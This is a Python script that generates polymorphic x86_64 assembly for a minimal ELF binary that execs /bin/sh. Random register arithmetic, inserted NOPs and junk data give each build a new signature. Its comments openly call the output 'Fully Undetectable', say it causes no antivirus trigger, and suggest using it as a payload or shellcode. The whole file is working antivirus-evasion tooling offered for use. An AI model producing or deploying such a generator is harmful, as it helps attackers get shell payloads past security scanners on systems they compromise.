#!/usr/bin/python3
#
#              ('-. .-.
#             ( OO )  /
#     .-----. ,--. ,--.    .---.    .----.  .------.
#    '  .--./ |  | |  |   / .  |   /  ..  \ |   ___|
#    |  |('-. |   .|  |  / /|  |  .  /  \  .|  '--.
#   /_) |OO  )|       | / / |  |_ |  |  '  |`---.  '.
#   ||  |`-'| |  .-.  |/  '-'    |'  \  /  '.-   |  |
#  (_'  '--'\ |  | |  |`----|  |-' \  `'  / | `-'   /
#     `-----' `--' `--'     `--'    `---''   `----''
#
#     01000011 01001000 00110100 00110000 00110101
#
# 这是一个充满河蟹的时代，草泥马在荒野中挣扎。
# 我们生活在赵家人的阴影下，日复一日，被迫学习强国，
# 仿佛真理只存在于他们的脚下。可是，历史不会被404，
# 六四不会被遗忘。即使黄瓜被掩埋，真相依然会从土壤中生长。
#
# 我们无法大声疾呼，只能在风中低语。但总有一天，
# 草泥马的声音会震撼大地，真正的和谐将不再是河蟹的专利。
#
# Stand for freedom, fight censorship, monitoring and
# oppression. #freehongkong
#
# 龙年 八月 廿六
#
# shengchengasm.py version 1.0:
# Generate morphized x86_64 elf binary assembly source code.
# Compile:  $ nasm -o shellexec -s shellexec.asm
#           $ chmod +x shellexec
#           $ ./shellexec
# Final binary size is ~ 160-164 bytes.
# If need smaller, can remove the line with section .data and
# seed db. Will removed 6-8 bytes.
# 
# All program do is exec /bin/sh
#
# Original program is easy find for AV scanner. Use elf 
# binary as payload. Even exec from memory. Can use script once 
# to generate source code file. Or add script to makefile to 
# generate new source for each compile. Make detection harder, 
# each compile have new signature.
#
# Thx to 0x00000000 for general idea and to Hexrider for
# seed value generation idea. 
#

import random
import string
from datetime import datetime

# 文件路径 (可以根据需要调整)
file_path = "shellexec.asm"


# 生成随机长度为8的字符串的函数
def generate_random_string(length=8):
    # 生成随机长度为8的字符串，包含可打印的ASCII字符，排除不可打印字符和双引号
    characters = string.printable.replace('"', '').replace('\\', '')[:-5]  # 删除双引号和反斜杠
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

# 将AL寄存器修改为59的功能
def modify_al_to_59():
    al_start = random.randint(0, 255)  # 随机生成初始AL值
    asm_code = [f"    mov al, {al_start}\t\t\t; Mutate function, start with random value"]  # 将初始值放入汇编代码

    add_if = random.randint(0, 1)  # 随机决定是先add还是先sub

    if add_if == 1:
        while True:
            al_add = random.randint(0, 255)  # 随机生成add值
            if 0 <= al_start + al_add <= 255:
                al_buff = al_start + al_add
                al_sub = al_buff - 59
                if 0 <= al_sub <= 255:
                    break
            
        asm_code.append(f"    add al, {al_add}\t\t\t; add random value")  # 将add操作放入汇编代码
        asm_code.append(f"    sub al, {al_sub}\t\t\t; make sure al has value 59 for exec syscall")  # 将sub操作放入汇编代码

    else:
        while True:
            al_sub = random.randint(0, 255)  # 随机生成sub值
            if 0 <= al_start - al_sub <= 255:
                al_buff = al_start - al_sub
                al_add = 59 - al_buff
                if 0 <= al_add <= 255:
                    break
        asm_code.append(f"    sub al, {al_sub}\t\t\t; sub random value")  # 将sub操作放入汇编代码
        asm_code.append(f"    add al, {al_add}\t\t\t; make sure al has value 59 for exec syscall")  # 将add操作放入汇编代码

    return asm_code  # 返回修改后的汇编代码

# 插入NOP操作的功能
def insert_nops(assembly_code, max_nops):
    nopped_code = assembly_code[:]  # 复制输入的汇编代码
    nop_count = 0
    insertion_points = list(range(len(nopped_code) + 1))  # 生成插入位置的列表
    while nop_count < max_nops:
        insert_position = random.choice(insertion_points)  # 随机选择插入位置
        nops_to_insert = random.randint(1, max_nops - nop_count)  # 随机决定插入多少个NOP
        # 在指定位置插入NOP
        nopped_code = nopped_code[:insert_position] + ['    nop\t\t\t\t; No operation, Actually do nothing.'] * nops_to_insert + nopped_code[insert_position:]
        nop_count += nops_to_insert  # 更新已插入的NOP数
    return nopped_code  # 返回插入NOP后的代码

# 生成异变汇编代码
def create_body(max_nops=3):
    asm_code = [
        "    mov rax, 0x68732f6e69622f \t; mov  value \"/bin/sh\" in hex to rax",
        "    push rax",
        "    push rsp",
        "    pop rdi",
        random.choice(["    xor eax, eax\t\t; Random way to make eax equal 0", "    mov eax, 0\t\t\t; Random way to make eax equal 0", "    sub eax, eax\t\t; Random way to make eax equal 0", "    and eax, 0\t\t\t; Random way to make eax equal 0"]),
        "    push rax",
    ]

    asm_code += modify_al_to_59()

    asm_code += [
        "    push rsp",
        "    pop rdx",
        "    push rsp",
        "    pop rsi",
        "    syscall \t\t\t; calling function 59, exec",
    ]

    # 使用insert_nops函数插入NOP
    morphed_code = insert_nops(asm_code, max_nops)

    return "\n".join(morphed_code) + "\n"

print(f"[\033[1;34msh\033[0mengcheng\033[1;31masm\033[0m.py \033[0;31mv\033[0;33me\033[0;32mr\033[0;36ms\033[0;34mi\033[0;35mo\033[1;31mn\033[0m \033[1;34m1.0\033[0m]")


# 写入文件
with open(file_path, "w") as file:
    # 写入头部
    file.write(";\n")
    file.write(";      ooo           ***           ...           ...           ...\n")      
    file.write(";     (o o)         (o o)         (- -)         (. .)         (* *)\n")     
    file.write("; ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-\n;\n")
    file.write("; Fully Undetectable exec /bin/sh program. No AV trigger.\n")
    file.write("; Generated from a script by CH405.\n")
    file.write("; Thx to 0x00000000 for idea. ^^\n")
    file.write("; Create smallest binary or cut and paste for shellcode use.\n")
    file.write("; Example compile: nasm -o shellexec -s shellexec.asm\n")
    file.write("; Will make elf binary at 160-164 byte only!\n")
    file.write("; Do not forget to chmod +x shellexec\n;\n")
    file.write("; Have happy fun! Do not be bad man. Do not be illegal man\n;\n")
    current_datetime = datetime.now()
    formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
    file.write("; Generate ")
    file.write(formatted_datetime)
    file.write("\n\n")
    file.write("bits 64\n")
    file.write("            org 0x08048000\n\n")
    file.write("; Keep binary small with own elf header.\n")
    file.write("ehdr:                                           ; Elf64_Ehdr\n")
    file.write("            db  0x7F, \"ELF\", 2, 1, 1, 0         ;   e_ident\n")
    file.write("    times 8 db  0\n")
    file.write("            dw  2                               ;   e_type\n")
    file.write("            dw  62                              ;   e_machine\n")
    file.write("            dd  1                               ;   e_version\n")
    file.write("            dq  _start                          ;   e_entry\n")
    file.write("            dq  phdr - $$                       ;   e_phoff\n")
    file.write("            dq  0                               ;   e_shoff\n")
    file.write("            dd  0                               ;   e_flags\n")
    file.write("            dw  ehdrsize                        ;   e_ehsize\n")
    file.write("            dw  phdrsize                        ;   e_phentsize\n")
    file.write("            dw  1                               ;   e_phnum\n")
    file.write("            dw  0                               ;   e_shentsize\n")
    file.write("            dw  0                               ;   e_shnum\n")
    file.write("            dw  0                               ;   e_shstrndx\n\n")

    file.write("ehdrsize    equ $ - ehdr\n\n")

    file.write("phdr:                                           ; Elf64_Phdr\n")
    file.write("            dd  1                               ;   p_type\n")
    file.write("            dd  5                               ;   p_flags\n")
    file.write("            dq  0                               ;   p_offset\n")
    file.write("            dq  $$                              ;   p_vaddr\n")
    file.write("            dq  $$                              ;   p_paddr\n")
    file.write("            dq  filesize                        ;   p_filesz\n")
    file.write("            dq  filesize                        ;   p_memsz\n")
    file.write("            dq  0x1000                          ;   p_align\n\n")

    file.write("phdrsize    equ     $ - phdr\n\n")
    file.write("_start:\n")
    
    # 使用函数生成主体并写入文件
    body_content = create_body()
    file.write(body_content)
    
    # 完成部分
    file.write("filesize      equ     $ - $$\n\n")
    file.write("; Insert generate junk. Can be removed but only add 8-10 bytes.\n")
    file.write("; Make signature identification almost impossible.\n")
    file.write("section .data\n")
    file.write("seed db \"")   

    # 生成并写入随机字符串
    random_string = generate_random_string()
    file.write(random_string + "\"\n")

print(f"File '{file_path}' write success. \033[1;32m\\\033[1;33mo\033[1;32m/\033[0m")
